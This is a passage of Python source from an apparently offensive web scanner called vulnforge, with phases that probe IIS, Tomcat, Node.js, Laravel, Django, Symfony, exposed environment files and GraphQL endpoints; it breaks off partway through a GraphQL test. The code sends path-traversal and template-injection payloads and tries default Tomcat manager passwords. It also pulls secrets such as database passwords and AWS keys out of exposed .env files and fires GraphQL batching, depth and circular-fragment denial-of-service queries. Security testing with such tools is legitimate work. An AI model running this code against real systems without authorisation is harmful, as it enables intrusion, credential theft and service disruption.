"""CMS and framework-specific phases: IIS/ASP.NET, Tomcat, Node.js, Laravel, Django, Symfony, env deep, GraphQL abuse."""

import base64
import json
import re
import socket
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path
from typing import Any, Dict, List

from vulnforge.phases.helpers import PhaseSet
from vulnforge.process import _PIPELINE_CFG
from vulnforge.tools import Tools
from vulnforge.utils import (
    _async_urlopen,
    _async_urlopen_no_redirect,
    _extra_headers_dict,
    _extract_host,
    _get_urlopener,
    _load_live_hosts,
    _throttle_rate,
    count_nonblank,
    ensure,
    log,
    read_lines,
)


async def phase_121_IISASPNET(
    outdir: Path,
    t: Tools,
    only: PhaseSet,
    skip: PhaseSet,
    prev: Dict[str, Any],
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"121-IISASPNET"}:
        return {}
    _out = outdir / "iis_aspnet_findings.txt"
    if _out.exists() and not force:
        return {"121-IISASPNET": str(_out), "count": count_nonblank(_out)}
    log("INFO", "Phase 121-IISASPNET: probing IIS/ASP.NET hosts")
    findings: List[str] = []
    _urlopen = _get_urlopener()
    _extra_h = _extra_headers_dict()
    hosts = _load_live_hosts(outdir)
    if not hosts:
        log("WARNING", "121-IISASPNET: no live hosts; skipping")
        return {"121-IISASPNET": str(_out), "count": 0}
    tech_file = outdir / "tech.txt"
    tech_lines = read_lines(tech_file) if tech_file.exists() else []
    for h in hosts:
        h = h if h.startswith("http") else f"https://{h}"
        is_iis = False
        is_java = False
        for line in tech_lines:
            if h in line:
                if (
                    "iis" in line.lower()
                    or "asp.net" in line.lower()
                    or "microsoft-iis" in line.lower()
                ):
                    is_iis = True
                if "java" in line.lower() or "tomcat" in line.lower() or "jetty" in line.lower():
                    is_java = True
        if not is_iis:
            try:
                req = urllib.request.Request(h, headers=_extra_h)
                status, resp_headers, body_bytes = await _async_urlopen(_urlopen, req, timeout=10)
                server = resp_headers.get("Server", "")
                if "microsoft-iis" in server.lower() or "asp.net" in server.lower():
                    is_iis = True
            except Exception:
                pass
        if not is_iis and not is_java:
            continue
        if is_iis:
            for path in ("/web.config", "/Web.config"):
                try:
                    req = urllib.request.Request(
                        h.rstrip("/") + path, headers=_extra_h, method="GET"
                    )
                    status, resp_headers, body_bytes = await _async_urlopen_no_redirect(req, timeout=10
                    )
                    if status == 200 and len(body_bytes) > 50:
                        findings.append(f"[iis-webconfig] {h}")
                        break
                except Exception:
                    pass
            for path in ("/elmah.axd", "/trace.axd"):
                try:
                    req = urllib.request.Request(
                        h.rstrip("/") + path, headers=_extra_h, method="GET"
                    )
                    status, resp_headers, body_bytes = await _async_urlopen_no_redirect(req, timeout=10
                    )
                    if status == 200:
                        findings.append(f"[iis-debug] {h} path={path}")
                except Exception:
                    pass
            for payload in ("/..\\..\\web.config", "\\..\\..\\web.config"):
                try:
                    req = urllib.request.Request(
                        h.rstrip("/") + payload, headers=_extra_h, method="GET"
                    )
                    status, resp_headers, body_bytes = await _async_urlopen_no_redirect(req, timeout=10
                    )
                    if status == 200:
                        findings.append(f"[iis-traversal] {h} payload={payload}")
                except Exception:
                    pass
        if is_java:
            for path in ("/WEB-INF/web.xml", "/META-INF/MANIFEST.MF"):
                try:
                    req = urllib.request.Request(
                        h.rstrip("/") + path, headers=_extra_h, method="GET"
                    )
                    status, resp_headers, body_bytes = await _async_urlopen_no_redirect(req, timeout=10
                    )
                    if status == 200:
                        tag = "java-webxml" if "web.xml" in path else "java-manifest"
                        findings.append(f"[{tag}] {h}")
                except Exception:
                    pass
    if not findings:
        findings.append("[iis-webconfig] No findings (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("OK", f"121-IISASPNET: {len(findings)} findings → {out}")
    return {"121-IISASPNET": str(out), "count": len(findings)}


async def phase_122_TOMCAT(
    outdir: Path,
    t: Tools,
    only: PhaseSet,
    skip: PhaseSet,
    prev: Dict[str, Any],
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"122-TOMCAT"}:
        return {}
    _out = outdir / "tomcat_findings.txt"
    if _out.exists() and not force:
        return {"122-TOMCAT": str(_out), "count": count_nonblank(_out)}
    log("INFO", "Phase 122-TOMCAT: probing Tomcat hosts")
    findings: List[str] = []
    _urlopen = _get_urlopener()
    _extra_h = _extra_headers_dict()
    hosts = _load_live_hosts(outdir)
    if not hosts:
        log("WARNING", "122-TOMCAT: no live hosts; skipping")
        return {"122-TOMCAT": str(_out), "count": 0}
    creds = [("tomcat", "tomcat"), ("admin", "admin"), ("tomcat", "s3cret")]
    for h in hosts:
        h = h if h.startswith("http") else f"https://{h}"
        for path in ("/manager/html", "/host-manager/html"):
            for user, passwd in creds:
                b64 = base64.b64encode(f"{user}:{passwd}".encode()).decode()
                headers = {**_extra_h, "Authorization": f"Basic {b64}"}
                try:
                    req = urllib.request.Request(
                        h.rstrip("/") + path, headers=headers, method="GET"
                    )
                    status, resp_headers, body_bytes = await _async_urlopen_no_redirect(req, timeout=10
                    )
                    if status == 200:
                        findings.append(f"[tomcat-manager] {h} creds={user}:{passwd}")
                except Exception:
                    pass
        for path in ("/jmx-console/", "/invoker/JMXInvokerServlet"):
            try:
                req = urllib.request.Request(h.rstrip("/") + path, headers=_extra_h, method="GET")
                status, resp_headers, body_bytes = await _async_urlopen_no_redirect(req, timeout=10
                )
                if status == 200:
                    findings.append(f"[tomcat-jmx] {h}")
                    break
            except Exception:
                pass
        for path in ("/WEB-INF/classes/", "/META-INF/MANIFEST.MF"):
            try:
                req = urllib.request.Request(h.rstrip("/") + path, headers=_extra_h, method="GET")
                status, resp_headers, body_bytes = await _async_urlopen_no_redirect(req, timeout=10
                )
                if status == 200:
                    findings.append(f"[tomcat-manifest] {h} path={path}")
            except Exception:
                pass
        for path in ("/jenkins/", "/hudson/"):
            try:
                req = urllib.request.Request(h.rstrip("/") + path, headers=_extra_h, method="GET")
                status, resp_headers, body_bytes = await _async_urlopen_no_redirect(req, timeout=10
                )
                if status == 200:
                    findings.append(f"[tomcat-jenkins] {h}")
            except Exception:
                pass
    if not findings:
        findings.append("[tomcat-manager] No findings (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("OK", f"122-TOMCAT: {len(findings)} findings → {out}")
    return {"122-TOMCAT": str(out), "count": len(findings)}


def _nodejs_ssti_triggered(injected_body: str, control_body: str) -> bool:
    return "49" in injected_body and "49" not in control_body


async def phase_123_NODEJS(
    outdir: Path,
    t: Tools,
    only: PhaseSet,
    skip: PhaseSet,
    prev: Dict[str, Any],
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"123-NODEJS"}:
        return {}
    _out = outdir / "nodejs_findings.txt"
    if _out.exists() and not force:
        return {"123-NODEJS": str(_out), "count": count_nonblank(_out)}
    log("INFO", "Phase 123-NODEJS: probing Node.js/Express hosts")
    findings: List[str] = []
    _urlopen = _get_urlopener()
    _extra_h = _extra_headers_dict()
    hosts = _load_live_hosts(outdir)
    if not hosts:
        log("WARNING", "123-NODEJS: no live hosts; skipping")
        return {"123-NODEJS": str(_out), "count": 0}
    tech_file = outdir / "tech.txt"
    tech_lines = read_lines(tech_file) if tech_file.exists() else []
    for h in hosts:
        h = h if h.startswith("http") else f"https://{h}"
        is_node = False
        for line in tech_lines:
            if h in line and ("node" in line.lower() or "express" in line.lower()):
                is_node = True
                break
        if not is_node:
            try:
                req = urllib.request.Request(h, headers=_extra_h, method="GET")
                status, resp_headers, body_bytes = await _async_urlopen(_urlopen, req, timeout=10)
                server = resp_headers.get("Server", "")
                if "node" in server.lower() or "express" in server.lower():
                    is_node = True
            except Exception:
                pass
        if not is_node:
            continue
        for path in ("/.env", "/package.json", "/node_modules/"):
            try:
                req = urllib.request.Request(h.rstrip("/") + path, headers=_extra_h, method="GET")
                status, resp_headers, body_bytes = await _async_urlopen_no_redirect(req, timeout=10
                )
                if status == 200:
                    findings.append(f"[nodejs-exposed] {h} path={path}")
            except Exception:
                pass
        for path in ("/_debug/", "/__debug/"):
            try:
                req = urllib.request.Request(h.rstrip("/") + path, headers=_extra_h, method="GET")
                status, resp_headers, body_bytes = await _async_urlopen_no_redirect(req, timeout=10
                )
                if status == 200:
                    findings.append(f"[nodejs-debug] {h} path={path}")
            except Exception:
                pass
        for param in ("q", "search", "name", "page"):
            control_val = "vulnforge_ctrl_control"
            control_url = h.rstrip("/") + f"?{param}={control_val}"
            try:
                req = urllib.request.Request(control_url, headers=_extra_h, method="GET")
                _, _, control_body_bytes = await _async_urlopen(_urlopen, req, timeout=10)
                control_body = control_body_bytes.decode("utf-8", errors="replace")
            except Exception:
                continue
            for payload in ("<%= 7*7 %>", "#{7*7}"):
                url = h.rstrip("/") + f"?{param}={urllib.parse.quote(payload)}"
                try:
                    req = urllib.request.Request(url, headers=_extra_h, method="GET")
                    status, resp_headers, body_bytes = await _async_urlopen(
                        _urlopen, req, timeout=10
                    )
                    body_str = body_bytes.decode("utf-8", errors="replace")
                    if _nodejs_ssti_triggered(body_str, control_body):
                        findings.append(f"[nodejs-ssti] {url} param={param}")
                        break
                except Exception:
                    pass
    if not findings:
        findings.append("[nodejs-exposed] No findings (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("OK", f"123-NODEJS: {len(findings)} findings → {out}")
    return {"123-NODEJS": str(out), "count": len(findings)}


_ENV_KEY_VALUE_RE = re.compile(r"(?m)^[A-Z][A-Z0-9_]*\s*=")
_LARAVEL_LOG_RE = re.compile(
    r"\[\d{4}-\d{2}-\d{2}[ T]\d{2}:\d{2}:\d{2}\]\s+"
    r"(?:local|production|testing)\.(?:EMERGENCY|ALERT|CRITICAL|ERROR|WARNING|NOTICE|INFO|DEBUG):"
)


def _is_env_file_content(body_str: str) -> bool:
    return bool(_ENV_KEY_VALUE_RE.search(body_str))


def _is_laravel_log_content(body_str: str) -> bool:
    return bool(_LARAVEL_LOG_RE.search(body_str))


def _is_laravel_fingerprint(resp_headers: Any, body_str: str) -> bool:
    lowered = {str(k).lower(): str(v).lower() for k, v in resp_headers.items()}
    set_cookie = lowered.get("set-cookie", "")
    if "laravel_session" in set_cookie or "xsrf-token" in set_cookie:
        return True
    return bool(re.search(r'name=["\']csrf-token["\']', body_str, re.IGNORECASE))


async def phase_124_LARAVEL(
    outdir: Path,
    t: Tools,
    only: PhaseSet,
    skip: PhaseSet,
    prev: Dict[str, Any],
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"124-LARAVEL"}:
        return {}
    _out = outdir / "laravel_exposure.txt"
    if _out.exists() and not force:
        return {"124-LARAVEL": str(_out), "count": count_nonblank(_out)}
    log("INFO", "Phase 124-LARAVEL: probing Laravel exposures")
    findings: List[str] = []
    _urlopen = _get_urlopener()
    _extra_h = _extra_headers_dict()
    hosts = _load_live_hosts(outdir)
    if not hosts:
        log("WARNING", "124-LARAVEL: no live hosts; skipping")
        return {"124-LARAVEL": str(_out), "count": 0}
    for h in hosts:
        h = h if h.startswith("http") else f"https://{h}"
        try:
            fp_req = urllib.request.Request(h.rstrip("/") + "/", headers=_extra_h, method="GET")
            fp_status, fp_headers, fp_body = await _async_urlopen_no_redirect(fp_req, timeout=10
            )
        except Exception:
            continue
        if not _is_laravel_fingerprint(fp_headers, fp_body.decode("utf-8", errors="replace")):
            continue
        secrets_found = []
        for path in ("/.env", "/.env.backup", "/.env.local", "/.env.production"):
            try:
                req = urllib.request.Request(h.rstrip("/") + path, headers=_extra_h, method="GET")
                status, resp_headers, body_bytes = await _async_urlopen_no_redirect(req, timeout=10
                )
                if status == 200:
                    body_str = body_bytes.decode("utf-8", errors="replace")
                    if not _is_env_file_content(body_str):
                        continue
                    exposed = []
                    for key in ("APP_KEY", "DB_PASSWORD", "AWS_SECRET"):
                        m = re.search(rf"^{key}=(.+)$", body_str, re.MULTILINE)
                        if m:
                            exposed.append(m.group(0))
                    if exposed:
                        secrets_found.append(f"{path}:{','.join(exposed)}")
                    else:
                        findings.append(f"[laravel-env] {h} path={path}")
            except Exception:
                pass
        if secrets_found:
            for entry in secrets_found:
                findings.append(
                    f"[laravel-env] {h} path={entry.split(':')[0]} secrets={entry.split(':', 1)[1]}"
                )
        try:
            req = urllib.request.Request(
                h.rstrip("/") + "/storage/logs/laravel.log", headers=_extra_h, method="GET"
            )
            status, resp_headers, body_bytes = await _async_urlopen_no_redirect(req, timeout=10
            )
            if status == 200 and _is_laravel_log_content(
                body_bytes.decode("utf-8", errors="replace")
            ):
                findings.append(f"[laravel-log] {h}")
        except Exception:
            pass
        for path in ("/telescope", "/horizon"):
            try:
                req = urllib.request.Request(h.rstrip("/") + path, headers=_extra_h, method="GET")
                status, resp_headers, body_bytes = await _async_urlopen_no_redirect(req, timeout=10
                )
                if (
                    status == 200
                    and path[1:] in body_bytes.decode("utf-8", errors="replace").lower()
                ):
                    findings.append(f"[laravel-dashboard] {h} path={path}")
            except Exception:
                pass
    if not findings:
        findings.append("[laravel-env] No findings (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("OK", f"124-LARAVEL: {len(findings)} findings → {out}")
    return {"124-LARAVEL": str(out), "count": len(findings)}


async def phase_125_DJANGO(
    outdir: Path,
    t: Tools,
    only: PhaseSet,
    skip: PhaseSet,
    prev: Dict[str, Any],
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"125-DJANGO"}:
        return {}
    _out = outdir / "django_exposure.txt"
    if _out.exists() and not force:
        return {"125-DJANGO": str(_out), "count": count_nonblank(_out)}
    log("INFO", "Phase 125-DJANGO: probing Django debug mode")
    findings: List[str] = []
    _urlopen = _get_urlopener()
    _extra_h = _extra_headers_dict()
    hosts = _load_live_hosts(outdir)
    if not hosts:
        log("WARNING", "125-DJANGO: no live hosts; skipping")
        return {"125-DJANGO": str(_out), "count": 0}
    for h in hosts:
        h = h if h.startswith("http") else f"https://{h}"
        for trigger_path in ("/nonexistent_page_xyz", "/admin/login/../../"):
            try:
                req = urllib.request.Request(
                    h.rstrip("/") + trigger_path, headers=_extra_h, method="GET"
                )
                status, resp_headers, body_bytes = await _async_urlopen_no_redirect(req, timeout=10
                )
                body_str = body_bytes.decode("utf-8", errors="replace")
                if (
                    "Django" in body_str
                    and "Traceback" in body_str
                    and "settings" in body_str.lower()
                ):
                    findings.append(f"[django-debug] {h}")
                    break
            except urllib.error.HTTPError as e:
                body_str = e.read().decode("utf-8", errors="replace")
                if (
                    "Django" in body_str
                    and "Traceback" in body_str
                    and "settings" in body_str.lower()
                ):
                    findings.append(f"[django-debug] {h}")
                    break
            except Exception:
                pass
        for path in ("/admin/", "/admin/login/"):
            try:
                req = urllib.request.Request(h.rstrip("/") + path, headers=_extra_h, method="GET")
                status, resp_headers, body_bytes = await _async_urlopen_no_redirect(req, timeout=10
                )
                if status == 200:
                    findings.append(f"[django-admin] {h} path={path}")
            except Exception:
                pass
        for path in ("/settings.py", "/local_settings.py"):
            try:
                req = urllib.request.Request(h.rstrip("/") + path, headers=_extra_h, method="GET")
                status, resp_headers, body_bytes = await _async_urlopen_no_redirect(req, timeout=10
                )
                if status == 200:
                    findings.append(f"[django-settings] {h} path={path}")
            except Exception:
                pass
        for api_path in ("/api/", "/api/v1/", "/api/v2/"):
            try:
                req = urllib.request.Request(
                    h.rstrip("/") + api_path,
                    headers={**_extra_h, "Accept": "text/html,application/json"},
                    method="GET",
                )
                status, resp_headers, body_bytes = await _async_urlopen_no_redirect(req, timeout=10
                )
                if status == 200:
                    body_str = body_bytes.decode("utf-8", errors="replace")
                    if "Django REST framework" in body_str or "Api" in body_str:
                        findings.append(f"[django-drf] {h}")
                        break
            except Exception:
                pass
    if not findings:
        findings.append("[django-debug] No findings (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("OK", f"125-DJANGO: {len(findings)} findings → {out}")
    return {"125-DJANGO": str(out), "count": len(findings)}


async def phase_126_SYMFONY(
    outdir: Path,
    t: Tools,
    only: PhaseSet,
    skip: PhaseSet,
    prev: Dict[str, Any],
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"126-SYMFONY"}:
        return {}
    _out = outdir / "symfony_profiler.txt"
    if _out.exists() and not force:
        return {"126-SYMFONY": str(_out), "count": count_nonblank(_out)}
    log("INFO", "Phase 126-SYMFONY: probing Symfony profiler")
    findings: List[str] = []
    _urlopen = _get_urlopener()
    _extra_h = _extra_headers_dict()
    hosts = _load_live_hosts(outdir)
    if not hosts:
        log("WARNING", "126-SYMFONY: no live hosts; skipping")
        return {"126-SYMFONY": str(_out), "count": 0}
    for h in hosts:
        h = h if h.startswith("http") else f"https://{h}"
        for path in ("/_profiler", "/_profiler/phpinfo", "/_profiler/router"):
            try:
                req = urllib.request.Request(h.rstrip("/") + path, headers=_extra_h, method="GET")
                status, resp_headers, body_bytes = await _async_urlopen_no_redirect(req, timeout=10
                )
                if status == 200:
                    findings.append(f"[symfony-profiler] {h} path={path}")
            except Exception:
                pass
        try:
            req = urllib.request.Request(h.rstrip("/") + "/_wdt", headers=_extra_h, method="GET")
            status, resp_headers, body_bytes = await _async_urlopen_no_redirect(req, timeout=10
            )
            if status == 200:
                findings.append(f"[symfony-wdt] {h}")
        except Exception:
            pass
        try:
            req = urllib.request.Request(
                h.rstrip("/") + "/app_dev.php/_profiler", headers=_extra_h, method="GET"
            )
            status, resp_headers, body_bytes = await _async_urlopen_no_redirect(req, timeout=10
            )
            if status == 200:
                findings.append(f"[symfony-profiler] {h} path=/app_dev.php/_profiler")
        except Exception:
            pass
    if not findings:
        findings.append("[symfony-profiler] No findings (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("OK", f"126-SYMFONY: {len(findings)} findings → {out}")
    return {"126-SYMFONY": str(out), "count": len(findings)}


async def phase_131_ENVDEEP(
    outdir: Path,
    t: Tools,
    only: PhaseSet,
    skip: PhaseSet,
    prev: Dict[str, Any],
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"131-ENVDEEP"}:
        return {}
    _out = outdir / "env_files_found.txt"
    if _out.exists() and not force:
        return {"131-ENVDEEP": str(_out), "count": count_nonblank(_out)}
    log("INFO", "Phase 131-ENVDEEP: Deep Env File Scanning")
    findings: List[str] = []
    _urlopen = _get_urlopener()
    _extra_h = _extra_headers_dict()
    hosts = _load_live_hosts(outdir)
    if not hosts:
        log("WARNING", "131-ENVDEEP: no live hosts; skipping")
        return {"131-ENVDEEP": str(_out), "count": 0}
    env_paths = [
        "/.env",
        "/.env.local",
        "/.env.dev",
        "/.env.staging",
        "/.env.production",
        "/.env.bak",
        "/env.js",
        "/config.js",
        "/config.json",
        "/config.yml",
        "/wp-config.php.bak",
        "/wp-config.php~",
        "/wp-config.php.old",
        "/database.yml",
        "/credentials.yml",
        "/secrets.yml",
    ]
    env_type_map = {
        "/.env": "env",
        "/.env.local": "env-local",
        "/.env.dev": "env-dev",
        "/.env.staging": "env-staging",
        "/.env.production": "env-prod",
        "/.env.bak": "env-bak",
        "/env.js": "env-js",
        "/config.js": "config-js",
        "/config.json": "config-json",
        "/config.yml": "config-yml",
        "/wp-config.php.bak": "wp-config-bak",
        "/wp-config.php~": "wp-config-swp",
        "/wp-config.php.old": "wp-config-old",
        "/database.yml": "database-yml",
        "/credentials.yml": "credentials-yml",
        "/secrets.yml": "secrets-yml",
    }
    secret_patterns = [
        (re.compile(r"(?i)(password|passwd|pwd)\s*[:=]\s*['\"]?([^\s'\"&;]+)"), "password"),
        (re.compile(r"(?i)(api[_-]?key|api_key)\s*[:=]\s*['\"]?([^\s'\"&;]+)"), "api_key"),
        (re.compile(r"(?i)(secret)\s*[:=]\s*['\"]?([^\s'\"&;]+)"), "secret"),
        (re.compile(r"(?i)(token)\s*[:=]\s*['\"]?([^\s'\"&;]+)"), "token"),
        (re.compile(r"(?:mysql|postgres|mongodb|redis)://[^\s'\"&;]+"), "connection_string"),
        (re.compile(r"AKIA[0-9A-Z]{16}"), "aws_key"),
    ]
    for host in hosts:
        for path in env_paths:
            url = f"https://{host}{path}"
            try:
                req = urllib.request.Request(url, headers=_extra_h, method="GET")
                status, resp_headers, body_bytes = await _async_urlopen(_urlopen, req, timeout=10)
                if status == 200:
                    body_str = body_bytes.decode("utf-8", errors="replace")
                    found_secrets = []
                    for pattern, stype in secret_patterns:
                        for m in pattern.finditer(body_str):
                            val = m.group(2) if m.lastindex and m.lastindex >= 2 else m.group()
                            found_secrets.append(f"{stype}:{val[:40]}")
                    findings.append(
                        f"[env-file] {host} path={path} type={env_type_map.get(path, 'unknown')} secrets={','.join(found_secrets) if found_secrets else 'none'}"
                    )
            except Exception:
                pass
        await _throttle_rate()
    if not findings:
        findings.append("[env-file] No findings (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("OK", f"131-ENVDEEP: {len(findings)} findings \u2192 {out}")
    return {"131-ENVDEEP": str(out), "count": len(findings)}


async def phase_132_GQLABUSE(
    outdir: Path,
    t: Tools,
    only: PhaseSet,
    skip: PhaseSet,
    prev: Dict[str, Any],
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"132-GQLABUSE"}:
        return {}
    _out = outdir / "graphql_abuse.txt"
    if _out.exists() and not force:
        return {"132-GQLABUSE": str(_out), "count": count_nonblank(_out)}
    log("INFO", "Phase 132-GQLABUSE: GraphQL batching & DoS testing")
    findings: List[str] = []
    _urlopen = _get_urlopener()
    _extra_h = _extra_headers_dict()

    introspection_file = outdir / "graphql_introspection.txt"
    hosts_file = outdir / "hosts.txt"
    hosts = read_lines(hosts_file) if hosts_file.exists() else []

    gql_endpoints = []
    if introspection_file.exists():
        for line in read_lines(introspection_file):
            line = line.strip()
            if not line:
                continue
            if line.startswith("  "):
                continue
            parts = line.split()
            url_token = parts[1] if len(parts) >= 2 else ""
            if url_token.startswith("http"):
                gql_endpoints.append(url_token)
            elif line.startswith("http"):
                gql_endpoints.append(parts[0])
    if not gql_endpoints:
        for h in hosts:
            h = h.strip()
            if not h:
                continue
            host = _extract_host(h)
            if not host:
                continue
            gql_endpoints.append(f"https://{host}/graphql")
            gql_endpoints.append(f"http://{host}/graphql")

    if not gql_endpoints:
        log("WARNING", "132-GQLABUSE: no GraphQL endpoints found; skipping")
        return {"132-GQLABUSE": str(_out), "count": 0}

    sample = int(getattr(_PIPELINE_CFG, "sample_hosts_gqlabuse", 10))
    gql_endpoints = gql_endpoints[:sample]

    depth10 = "{ user { friends { friends { friends { friends { __typename } } } } } }"

    for ep in gql_endpoints:
        await _throttle_rate()
        # Test 1: Batched queries — POST with array of 50 queries
        try:
            batch_payload = json.dumps([{"query": "{__typename}"}] * 50).encode("utf-8")
            req = urllib.request.Request(
                ep,
                data=batch_payload,
                headers={
                    "Content-Type": "application/json",
                    "Accept": "application/json",
                    **_extra_h,
                },
                method="POST",
            )
            status, resp_headers, body_bytes = await _async_urlopen(_urlopen, req, timeout=12)
            body = body_bytes.decode("utf-8", errors="replace")
            if status == 200:
                try:
                    parsed = json.loads(body)
                    if isinstance(parsed, list):
                        count = len(parsed)
                    else:
                        count = 1
                    if count > 1:
                        findings.append(f"[gql-batch] {ep} count={count} accepted")
                except (json.JSONDecodeError, ValueError):
                    pass
        except (urllib.error.URLError, urllib.error.HTTPError, OSError, socket.timeout):
            pass
        except Exception:
            pass

        # Test 2: Query depth DoS — deeply nested query
        try:
            depth_payload = json.dumps({"query": depth10}).encode("utf-8")
            req = urllib.request.Request(
                ep,
                data=depth_payload,
                headers={
                    "Content-Type": "application/json",
                    "Accept": "application/json",
                    **_extra_h,
                },
                method="POST",
            )
            status, resp_headers, body_bytes = await _async_urlopen(_urlopen, req, timeout=12)
            body = body_bytes.decode("utf-8", errors="replace")
            if status == 200 and body:
                try:
                    parsed = json.loads(body)
                    if "data" in parsed or "errors" not in parsed:
                        findings.append(f"[gql-depth-attack] {ep} depth=10 accepted")
                except (json.JSONDecodeError, ValueError):
                    pass
        except (urllib.error.URLError, urllib.error.HTTPError, OSError, socket.timeout):
            pass
        except Exception:
            pass

        # Test 3: Introspection disabled but schema leaked via error messages
        try:
            introspect_payload = json.dumps(
                {"query": "{__schema{types{name,fields{name}}}}"}
            ).encode("utf-8")
            req = urllib.request.Request(
                ep,
                data=introspect_payload,
                headers={
                    "Content-Type": "application/json",
                    "Accept": "application/json",
                    **_extra_h,
                },
                method="POST",
            )
            status, resp_headers, body_bytes = await _async_urlopen(_urlopen, req, timeout=12)
            body = body_bytes.decode("utf-8", errors="replace")
            if body:
                schema_keywords = ["type", "field", "query", "mutation", "subscription", "schema"]
                body_lower = body.lower()
                for kw in schema_keywords:
                    if kw in body_lower and (
                        "introspection" in body_lower
                        or "disabled" in body_lower
                        or "not allowed" in body_lower
                    ):
                        detail = body[:200].replace("\n", " ")
                        findings.append(f"[gql-schema-leak] {ep} detail={detail}")
                        break
        except (urllib.error.URLError, urllib.error.HTTPError, OSError, socket.timeout):
            pass
        except Exception:
            pass

        # Test 4: Field suggestions leaking schema info
        try:
            typo_payload = json.dumps({"query": "{ uzer { naem } }"}).encode("utf-8")
            req = urllib.request.Request(
                ep,
                data=typo_payload,
                headers={
                    "Content-Type": "application/json",
                    "Accept": "application/json",
                    **_extra_h,
                },
                method="POST",
            )
            _, _, body_bytes = await _async_urlopen(_urlopen, req, timeout=12)
            body = body_bytes.decode("utf-8", errors="replace")
            if body:
                suggest_match = re.search(r"suggest[^\"]*\"([^\"]+)\"", body, re.IGNORECASE)
                if suggest_match:
                    detail = suggest_match.group(0)[:200]
                    findings.append(f"[gql-schema-leak] {ep} detail={detail}")
        except (urllib.error.URLError, urllib.error.HTTPError, OSError, socket.timeout):
            pass
        except Exception:
            pass

        # Test 5: Batch attack with 100 queries
        try:
            batch100_payload = json.dumps([{"query": "{__typename}"}] * 100).encode("utf-8")
            req = urllib.request.Request(
                ep,
                data=batch100_payload,
                headers={
                    "Content-Type": "application/json",
                    "Accept": "application/json",
                    **_extra_h,
                },
                method="POST",
            )
            status, _, body_bytes = await _async_urlopen(_urlopen, req, timeout=15)
            body = body_bytes.decode("utf-8", errors="replace")
            if status == 200:
                try:
                    parsed = json.loads(body)
                    if isinstance(parsed, list) and len(parsed) > 1:
                        findings.append(f"[gql-batch-100] {ep} accepted 100-query batch")
                except (json.JSONDecodeError, ValueError):
                    pass
        except Exception:
            pass

        # Test 6: Circular fragment DoS
        try:
            fragment_payload = json.dumps(
                {"query": "query A { ...B } fragment B on Query { ...A }"}
            ).encode("utf-8")
            req = urllib.request.Request(
                ep,
                data=fragment_payload,
                headers={
                    "Content-Type": "application/json",
                    "Accept": "application/json",
                    **_extra_h,
                },
                method="POST",
            )
            status, _, body_bytes = await _async_urlopen(_urlopen, req, timeout=8)
            body = body_bytes.decode("utf-8", errors="replace")
            if status == 200:
                findings.append(
                    f"[gql-circular-fragment] {ep} accepted circular fragment (DoS potential)"
                )
        except Exception:
            pass

        # Test 7: Mutation without auth
        try:
            mutation_payload = json.dumps(
                {"query": 'mutation { updateUser(input: {name: "test"}) { id } }'}
            ).encode("utf-8")
            req = urllib.request.Request(
                ep,
                data=mutation_payload,
                headers={
                    "Content-Type": "application/json",
                    "Accept": "application/json",
                    **_extra_h,
                },
                method="POST",
            )
            status, _, body_bytes = await _async_urlopen(_urlopen, req, timeout=10)
            body = body_bytes.decode("utf-8", errors="replace")
            body_lower = body.lower()
            if status == 200 and not any(
                kw in body_lower
                for kw in ["unauthorized", "forbidden", "auth", "permission", "denied"]
            ):
                if "data" in body_lower and "error" not in body_lower:
                    findings.append(
                        f"[gql-mutation-noauth] {ep} mutation accepted without authentication"
                    )
        except Exception:
            pass

        # Test 8: Alias batching (query amplification)
        try:
            alias_parts = [f"q{i}: __typename" for i in range(50)]
            alias_query = "{ " + " ".join(alias_parts) + " }"
            alias_payload = json.dumps({"query": alias_query}).encode("utf-8")
            req = urllib.request.Request(
                ep,
                data=alias_payload,
                headers={
                    "Content-Type": "application/json",
                    "Accept": "application/json",
                    **_extra_h,
                },
                method="POST",
            )
            status, _, body_bytes = await _async_urlopen(_urlopen, req, timeout=12)
            body = body_bytes.decode("utf-8", errors="replace")
            if status == 200:
                try:
                    parsed = json.loads(body)
                    if "data" in parsed:
                        findings.append(f"[gql-alias-amplification] {ep} 50-alias query accepted")
                except (json.JSONDecodeError, ValueError):
                    pass
        except Exception:
            pass

        # Test 9: Subscription probe
        try:
            sub_payload = json.dumps({"query": "subscription { onMessage { id content } }"}).encode(
                "utf-8"
            )
            req = urllib.request.Request(
                ep,
                data=sub_payload,
                headers={
                    "Content-Type": "application/json",
                    "Accept": "application/json",
                    **_extra_h,
                },
                method="POST",
            )
            status, _, body_bytes = await _async_urlopen(_urlopen, req, timeout=8)
            body = body_bytes.decode("utf-8", errors="replace")
            if status == 200 and "subscription" not in body.lower():
                findings.append(f"[gql-subscription] {ep} subscription query accepted")
        except Exception:
            pass

        # Test 10: Directive injection
        try:
            directive_payload = json.dumps({"query": "query @deprecated { __typename }"}).encode(
                "utf-8"
            )
            req = urllib.request.Request(
                ep,
                data=directive_payload,
                headers={
                    "Content-Type": "application/json",
                    "Accept": "application/json",
                    **_extra_h,
                },
                method="POST",
            )
            status, _, body_bytes = await _async_urlopen(_urlopen, req, timeout=8)
            body = body_bytes.decode("utf-8", errors="replace")
            if status == 200:
                try:
                    parsed = json.loads(body)
                    if "data" in parsed:
                        findings.append(f"[gql-directive-injection] {ep} custom directive accepted")
                except (json.JSONDecodeError, ValueError):
                    pass
        except Exception:
            pass

        # Test 11: Persisted query bypass (introspect in PQ-only mode)
        try:
            pq_bypass = json.dumps(
                {
                    "query": "{__typename}",
                    "extensions": {
                        "persistedQuery": {
                            "version": 1,
